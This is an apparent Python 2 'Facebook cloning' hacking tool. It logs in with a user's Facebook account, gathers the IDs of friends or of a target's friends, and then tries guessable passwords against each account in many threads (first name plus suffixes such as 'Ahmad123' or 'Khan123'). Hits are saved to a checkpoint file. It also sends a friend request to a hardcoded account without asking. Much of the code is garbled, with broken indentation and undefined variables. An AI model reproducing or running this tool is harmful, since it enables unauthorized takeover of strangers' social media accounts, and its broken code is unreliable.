#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
 \033[1;92m#  ๐๐ข๐๐ ๐๐๐ฅ๐๐                             
 \033[1;92m# ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ
 \033[1;92m# โโโฅโโโโโโโก 
 \033[1;92m# pakistani hacker
 \033[1;92m# Lอฬฝoอฬฝvอฬฝeอฬฝhอฬฝaอฬฝcอฬฝkอฬฝeอฬฝrอฬฝ
  \033[1;92m#  I love Pakistan
\033[1;92mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ
\033[1;92m	 Owner\033[1;97m: \033[1;92m ๐๐ข๐๐ ๐๐๐ฅ๐๐
\033[1;92m	 Youtube\033[1;97m: \033[1;92m โโโฅโโโโโโโก('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
\033[1;92mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
 \033[1;97m#  ๐๐ข๐๐ ๐๐๐ฅ๐๐                          
 \033[1;92m# ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ๏ผ
 \033[1;97m#  โโโฅโโโโโโโก
 \033[1;92m#  pakistani hackers
 \033[1;97m#    Lอฬฝoอฬฝvอฬฝeอฬฝhอฬฝaอฬฝcอฬฝkอฬฝeอฬฝrอฬฝ
 \033[1;92m#    ๐๐๐ฅ๐๐๐๐๐๐๐ก
 \033[1;92m#  Pakistani Hackers
 \033[1;91m#I love Pakistan   
\033[1;91m ๊ทฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬโฃ๐๐๐ฅ๐๐๐๐๐๐๐ก๊ทฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬฬฬออก๊ทฬฬฬฬฬฬฬโฃ
\033[1;92m  ยถยถยถยถยถยถยถยถๅๅๅๅๅๅ ยถยถยถยถยถยถยถยถยถยถยถยถยถๅ
\033[1;97m โดโโโโคโโโโโโโโฅโโโโด
\033[1;97m โดโโโโโฅโโฃโโขโโคโโโโโด
\033[1;97m โดโโโโโโโโโโโโโโโโด
\033[1;97m โดโโโโโฑโโโโโโฒโโโโโด
\033[1;97m โดโโโโฃโฃโโโโโโขโขโโโโด
\033[1;97m โดโโโโโฃโฅโโโโคโขโโโโโด
\033[1;97m โดโโโโโโฃโฒโโฑโขโโโโโโด
\033[1;97m โดโโโโโโโฃโโขโโโโโโโด
\033[1;92m โ?โ?โ?โ?โ?โ?โ?โ?โ?โ?โ?โ?โ?โ?
\033[1;97m โ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ
\033[1;92m	 Owner\033[1;97m: \033[1;92mLอฬฝoอฬฝvอฬฝeอฬฝhอฬฝaอฬฝcอฬฝkอฬฝeอฬฝrอฬฝ
\033[1;92m	 Youtube\033[1;97m: \033[1;92mhttps://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ"""

CorrectUsername = "love"
CorrectPassword = "hacker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\x1b[1;93mTool Username \x1b[1;93mยปยป \x1b[1;96m")
    if (username == CorrectUsername):
    	password = raw_input("\x1b[1;93mTool Password \x1b[1;93mยปยป \x1b[1;96m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print(' \033[1;91mWarning: \033[1;97m๐Do Not Use Your Personal Account .๐' )
		print "\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ"
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;92mLogin Successful...'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;91mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;97mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "	   \033[1;93m Name\033[1;93m:\033[1;97m"+nama+"\033[1;97m               "
	print "	   \033[1;93m ID\033[1;93m:\033[1;97m"+id+"\x1b[1;97m              "
	print "\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ"
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97mYour Choice>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;92m--\033[1;92m> \033[1;92m1.\x1b[1;92mHack From Friend List..."
	print "\033[1;92m--\033[1;92m> \033[1;92m2.\x1b[1;92mHack From Public ID..."
	print "\033[1;92m--\033[1;92m> \033[1;92m3.\x1b[1;92mHack From Group Cloning..."
	print "\033[1;92m--\033[1;92m> \033[1;92m4.\x1b[1;92mHack From Target ID..."
	print "\033[1;92m--\033[1;92m> \033[1;92m5.\x1b[1;92mFacebook ID Report..."
	print "\033[1;92m--\033[1;92m> \033[1;92m6.\x1b[1;92mGroup cloning..."
	print "\033[1;92m--\033[1;92m> \033[1;92m7.\x1b[1;92mGroup Report..."
	print "\033[1;92m--\033[1;92m> \033[1;97m0.\033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;93mYour Choice>>> \033[1;93m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;97mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ"
		jalan('\033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[+] \033[1;92mEnter ID\033[1;92m: \033[1;92m")
		print "\033[1;92mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ\033[1;92m<><>\033[1;93mโ๐๐๐ฅ๐๐๐๐๐๐๐กโ"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;92mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;92mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;93mTotal IDs\033[1;97m: \033[1;97m"+str(len(id))
	jalan('\033[1;92mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;93mยซ-----\x1b[1;92mใTo Stop Process Press CTRL+Zใ\033[1;97m----ยป"
	
			
	def main(arg):
		global chekpoint,ok
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('Ali123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
else:
     if 'www.facebook.com' in q["error_msg"]:
	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
	cek = open("out/checkpoint.txt", "a")		cek.write(user+"|"+pass1+"\n")
	cek.close()
		cekpoint.append(user+pass1)
	else:
		pass2 = b['first_name']+'Ahmad123'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		q = json.load(data)			if 'access_token' in q:
			print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
			oks.append(user+pass2)
	else:
			if 'www.facebook.com' in q["error_msg"]:
				print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
				cek = open("out/checkpoint.txt", "a")
				cek.write(user+"|"+pass2+"\n")
				cek.close()
				cekpoint.append(user+pass2)
	else:
				pass3 = b['first_name'] + 'Khan123'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				q = json.load(data)
			if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
	else:
		if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
	else:
									pass4 = 'Pakistan'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'india123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
											else:
													pass6 = b['first_name'] + '786786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
											else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
											else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + 'Qwerty123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
											else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass7+"\n")
															cek.close()
															cekpoint.append(user+pass7)
											else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass8 = b['first_name'] + 'Love123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
																oks.append(user+pass8)
				else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass8+"\n")
															cek.close()
															cekpoint.append(user+pass8)
				else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + 'Muhammad123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
																oks.append(user+pass9)
											else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass9+"\n")
															cek.close()
															cekpoint.append(user+pass9)
				else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass10 = b['first_name'] + 'Name007'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
																oks.append(user+pass10)
				else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass10+"\n")
															cek.close()
															cekpoint.append(user+pass10)
			else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass11 = b['first_name'] + 'Hacker123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
																oks.append(user+pass11)
			else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass11+"\n")
															cek.close()
															cekpoint.append(user+pass11)
				else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass11 = b['first_name'] + 'Pass123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12
																oks.append(user+pass12)
			else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass12+"\n")
																	cek.close()
																	cekpoint.append(user+pass12)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m๊ฃ๊ค๐๐๐ฅ๐๐๐๐๐๐๐ก๊ค๊ฃ\033[1;92m<><>\033[1;97m03094161457"
	print "  \033[1;92mยซ---------Developed By ๐๐๐ฅ๐๐๐๐๐๐๐ก------------ยป"
	print '\033[1;97mProcess Has Been Completed\033[1;92m....'
	print"\033[1;97mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;97mCP File Has Been Saved\033[1;92m:\033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
